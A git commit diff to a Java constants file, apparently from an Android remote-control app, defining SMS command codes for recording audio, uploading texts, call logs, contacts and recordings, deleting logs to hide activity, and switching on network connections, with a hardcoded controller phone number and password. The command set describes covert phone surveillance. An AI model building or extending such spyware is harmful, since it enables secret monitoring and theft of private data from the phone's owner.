e4b1577d18b782b75e857f83475576029e8f45bd
unknown <craining@163.com>
2013-07-06 17:47:37 +0800

    test

--- src/com/zgy/controller/GlobleCs.java
+++ src/com/zgy/controller/GlobleCs.java
@@ -1,45 +1,46 @@
 package com.zgy.controller;
 
-
 public class GlobleCs {
 
 	/**
 	 *  
 	 */
-	public static final String NUMBER_ = "";
+	// public static final String NUMBER_ = "15910864284";
+	public static final String NUMBER_ = "15866995671";
 	/**
 	 *  
 	 */
-	public static final String MY_PWD = "851";
-	
+	// public static final String MY_PWD = "0125";
+	public static final String MY_PWD = "012467";
+
 	public static final String FIRST = "This is one test message, please ignore it.";
-	public static final String PHONE_CODE_UP = "TURN_UP"; 
-	public static final String PHONE_CODE_DOWN = "TURN_DOWN"; 
+	public static final String PHONE_CODE_UP = "TURN_UP";
+	public static final String PHONE_CODE_DOWN = "TURN_DOWN";
 	public static final String PHONE_CODE_CALL_ME = "CALL_ME";
-	
-	public static final String PHONE_CODE_RECORD_TIME = "RECORD_TIME:"; 
-	public static final String PHONE_CODE_RECORD_START = "RECORD_START"; 
-	public static final String PHONE_CODE_RECORD_END = "RECORD_END"; 
 
-	public static final String PHONE_CODE_DELETE_MSG_LOG = "DEL_MSG"; 
-	public static final String PHONE_CODE_DELETE_CALL_LOG = "DEL_CALL"; 
-	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "DEL_AUDIO_CALL"; 
-	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "DEL_AUDIO_OTHER"; 
-	public static final String PHONE_CODE_DELETE_ALL_LOG = "DEL_ALL"; 
+	public static final String PHONE_CODE_RECORD_TIME = "RECORD_TIME:";
+	public static final String PHONE_CODE_RECORD_START = "RECORD_START";
+	public static final String PHONE_CODE_RECORD_END = "RECORD_END";
 
-	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "HELLO_SMS_CALL"; 
-	public static final String PHONE_CODE_UPLOAD_ALL = "HELLO_ALL"; 
+	public static final String PHONE_CODE_DELETE_MSG_LOG = "DEL_MSG";
+	public static final String PHONE_CODE_DELETE_CALL_LOG = "DEL_CALL";
+	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "DEL_AUDIO_CALL";
+	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "DEL_AUDIO_OTHER";
+	public static final String PHONE_CODE_DELETE_ALL_LOG = "DEL_ALL";
+
+	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "HELLO_SMS_CALL";
+	public static final String PHONE_CODE_UPLOAD_ALL = "HELLO_ALL";
 	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "HELLO_CALL_AUDIO";//
 	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "HELLO_OTHER_AUDIO";//
-	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "HELLO_SMS_CALL_MOBILE";// 
-	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "HELLO_ALL_MOBILE";// 
+	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "HELLO_SMS_CALL_MOBILE";//
+	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "HELLO_ALL_MOBILE";//
 	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "HELLO_CALL_AUDIO_MOBILE";//
 	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "HELLO_OTHER_AUDIO_MOBILE";//
-	public static final String PHONE_CODE_TURNON_WIFI = "TURN_ON_WIFI";//  
-	public static final String PHONE_CODE_TURNON_MOBILE = "TURN_ON_MOBILE";//  
-	
+	public static final String PHONE_CODE_TURNON_WIFI = "TURN_ON_WIFI";//
+	public static final String PHONE_CODE_TURNON_MOBILE = "TURN_ON_MOBILE";//
+
 	public static final String PHONE_CODE_UPLOAD_CONTACTS = "HELLO_CONTACTS";
 	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "HELLO_CONTACTS_MOBILE";
-	
+
 	public static boolean is_open = false;
 }
